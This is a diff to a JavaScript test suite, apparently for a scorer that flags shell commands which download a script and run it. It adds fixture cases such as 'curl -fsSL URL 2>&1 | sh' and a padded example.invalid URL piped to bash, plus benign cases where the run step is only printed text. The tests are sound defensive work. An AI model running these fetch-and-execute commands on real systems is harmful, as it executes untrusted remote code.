@@ -86,6 +86,11 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -s ${URL} -o /tmp/p && cat /tmp/p | bash`,
     `curl -fsSL -o p ${URL}; sh p`,
     `wget -qO setup.sh ${URL} && . setup.sh`,
+    // a redirect is not a separator, and a long quoted URL is still one argument
+    `curl -fsSL ${URL} 2>&1 | sh`,
+    `curl -fsSL ${URL} 2>&1 | tee /tmp/l | sh`,
+    `curl -fsSL ${URL} &>/dev/null | bash`,
+    `curl "https://example.invalid/x?pad=${"a".repeat(240)}" | bash`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -139,6 +144,9 @@ describe("commands that do not run what they download are not", () => {
     `curl -s ${URL} -o out.txt && sh build.sh`,
     `curl -s ${URL} -o out.txt; cat out.txt.bak | sh`,
     `wget -qO- ${URL} > list.txt; sh -n check.sh`,
+    // the saved file named in printed text is not run
+    `curl -s ${URL} -o out.txt; printf '%s\\n' 'run sh out.txt now'`,
+    `curl -s ${URL} -o out.txt; echo "then: cat out.txt | sh"`,
     // eval and busybox only where they run the download
     `printf '%s\\n' 'eval "$(curl -fsSL ${URL})"'`,
     `eval "$(ssh-agent -s)"`,
